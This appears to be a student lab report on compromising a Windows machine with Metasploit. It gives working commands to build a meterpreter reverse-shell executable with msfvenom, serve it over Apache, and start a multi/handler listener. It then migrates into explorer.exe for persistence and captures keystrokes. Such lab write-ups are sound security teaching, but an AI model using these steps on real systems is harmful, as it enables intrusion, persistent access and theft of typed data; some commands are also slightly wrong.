# Compromising-windows-using-Metasploit
Compromising windows using Metasploit

### NAME:- PAVITHRA R
### REG NO: 212222230106

Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

### PROGRAM:

Find the attackers ip address using ifconfig

### Output:
![Screenshot 2024-10-28 104103](https://github.com/user-attachments/assets/7c0cf93c-2bcf-4472-8e0c-48a0be5b1344)



Create a malicious executable file fun.exe using msenom command ``` msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe```

### Output:
![Screenshot 2024-10-28 104115](https://github.com/user-attachments/assets/16f8be4c-450a-4174-b3e8-3e43b6b51ee4)



copy the fun.exe into the apache ```/var/www/html ```folder
![Screenshot 2024-10-28 104124](https://github.com/user-attachments/assets/3a7dbe63-7f65-4c65-a3dd-421764f766f1)



Start apache server ```sudo systemctl apache2 start``` 
![Screenshot 2024-10-28 104132](https://github.com/user-attachments/assets/76e2aac9-de69-4482-8f5d-54396430ff02)



Check the status of apache2 ```sudo apache2 status```
![Screenshot 2024-10-28 104155](https://github.com/user-attachments/assets/7fe45094-2884-4cc2-8f3d-1fb03894baee)


Invoke msfconsole:

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server ```use multi/handler``` ```set PAYLOAD windows/meterpreter/reverse_tcp``` ```set LHOST 0.0.0.0``` ```exploit```

### Output 
![374795103-d6bd1bdb-3064-45e8-b6b1-e22d2e80209f](https://github.com/user-attachments/assets/108c6d73-63fc-415b-8b5d-5ddbeb7bdfb7)

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: ```http://192.168.1.2/fun.exe``` The file "fun.exe" downloads.
![374795180-7be60e9f-2ce3-487a-9668-8bdb282e8931](https://github.com/user-attachments/assets/2d3c9bbd-30bf-4db7-8957-4760d26234a1)


Bypass any warning boxes, double-click the file, and allow it to run.
On kali give the command exploit
![374795286-596d3916-66f9-4605-8ae4-5dd21116b77a](https://github.com/user-attachments/assets/3b6d33dd-159f-4798-926d-22dece021d73)

To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted

#### Post Exploitation:
The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
![374795471-d53176fa-7af0-4f05-b526-91713074335d](https://github.com/user-attachments/assets/70c71c8a-0ed9-42b7-a002-f07f1d50b459)


keyscan_dump Shows the keystrokes captured so far
![374795532-ec7c391d-62a6-4fdc-a2c3-ef383b6c8a57](https://github.com/user-attachments/assets/1b9359f7-97a1-4452-9cd8-4abba68f2246)


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
